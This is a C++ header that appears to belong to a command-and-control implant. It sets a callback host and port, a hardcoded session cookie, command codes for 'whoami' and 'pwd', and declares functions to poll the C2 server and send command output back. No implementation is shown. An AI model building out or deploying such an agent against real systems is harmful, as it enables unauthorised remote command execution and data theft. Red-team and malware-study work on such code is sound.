#define STRINGIZE(x) #x
#define STRINGIZE_VALUE_OF(x) STRINGIZE(x)

#ifndef REMOTE_HOST_IP_ADDRESS
#define REMOTE_HOST_IP_ADDRESS "192.168.1.68"
#endif

#ifndef HTTP_HOST
#define HTTP_HOST "rbct.it"
#endif

#ifndef HTTP_PORT
#define HTTP_PORT 1234
#endif

#ifndef HTTP_COOKIE_NAME
#define HTTP_COOKIE_NAME "PHPSESSID"
#endif

#ifndef HTTP_COOKIE_VALUE
#define HTTP_COOKIE_VALUE "8130ce092704ef058705095d9a610c06"
#endif

#ifndef HTTP_PROTO_VER
#define HTTP_PROTO_VER "1.1"
#endif

#ifndef HTTP_GET_PAGE
#define HTTP_GET_PAGE "/index.php"
#endif

#ifndef HTTP_POST_PAGE
#define HTTP_POST_PAGE "/submit.php"
#endif

#ifndef COMMAND_WHOAMI
#define COMMAND_WHOAMI "1324"
#endif

#ifndef COMMAND_PWD
#define COMMAND_PWD "43534"
#endif

#ifndef SLEEP_SECONDS
#define SLEEP_SECONDS 10
#endif

#define EXIT_SUCCESS 0
#define FAILED_PIPE_CREATION 1
#define FAILED_PROCESS_CREATION 2
#define WRONG_HTTP_CODE 3
#define HTTP_PROCESSING_ERROR 4
#define FAIL_COMMAND_EXECUTION 5

int poll_c2();
int parse_http_response(std::vector<char> http_response);
int parse_http_response_body(std::vector<char> http_response, int http_body_index);
int send_command_output(std::vector<char> command_output);
